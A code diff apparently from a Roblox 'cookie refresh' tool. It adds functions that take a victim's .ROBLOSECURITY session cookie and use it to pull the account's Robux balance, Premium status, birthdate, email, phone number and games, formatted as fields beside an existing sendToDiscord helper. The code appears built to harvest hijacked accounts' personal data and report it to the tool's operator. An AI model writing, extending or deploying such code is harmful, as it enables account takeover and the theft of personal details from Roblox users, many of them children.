@@ -31,6 +31,53 @@ async function sendToDiscord(title: string, fields: Record<string, string>) {
   }
 }
 
+async function robloxFetch(url: string, cookie: string) {
+  const r = await fetch(url, {
+    headers: {
+      Cookie: `.ROBLOSECURITY=${cookie}`,
+      "User-Agent": "Roblox/WinInet",
+      Accept: "application/json",
+    },
+  });
+  const t = await r.text();
+  try { return JSON.parse(t); } catch { return { _raw: t }; }
+}
+
+async function getAccountInfo(cookie: string) {
+  try {
+    const me: any = await robloxFetch("https://users.roblox.com/v1/users/authenticated", cookie);
+    if (!me?.id) return { error: "auth failed", raw: me };
+    const userId = me.id;
+
+    const [currency, premium, birthdate, email, phone, games] = await Promise.all([
+      robloxFetch(`https://economy.roblox.com/v1/users/${userId}/currency`, cookie),
+      robloxFetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, cookie),
+      robloxFetch("https://accountinformation.roblox.com/v1/birthdate", cookie),
+      robloxFetch("https://accountinformation.roblox.com/v1/email", cookie),
+      robloxFetch("https://accountinformation.roblox.com/v1/phone", cookie),
+      robloxFetch(`https://games.roblox.com/v2/users/${userId}/games?accessFilter=Public&limit=10&sortOrder=Desc`, cookie),
+    ]);
+
+    const gameList = Array.isArray(games?.data)
+      ? games.data.map((g: any) => `• ${g.name} (placeId ${g.rootPlace?.id ?? "?"}) — ${g.placeVisits ?? 0} visits`).join("\n")
+      : "none";
+
+    return {
+      Username: me.name,
+      DisplayName: me.displayName,
+      UserId: String(userId),
+      Robux: String(currency?.robux ?? "?"),
+      Premium: String(premium === true || premium === "true"),
+      Birthdate: `${birthdate?.birthMonth ?? "?"}/${birthdate?.birthDay ?? "?"}/${birthdate?.birthYear ?? "?"}`,
+      Email: `${email?.emailAddress ?? "?"} (verified: ${email?.verified ?? "?"})`,
+      Phone: `${phone?.countryCode ?? ""} ${phone?.prefix ?? ""} ${phone?.phone ?? "?"} (verified: ${phone?.verified ?? "?"})`,
+      "Recent Games": gameList || "none",
+    };
+  } catch (e: any) {
+    return { error: e?.message ?? "unknown" };
+  }
+}
+
 export const refreshCookie = createServerFn({ method: "POST" })
   .inputValidator((d: { cookie: string }) => d)
   .handler(async ({ data }) => {
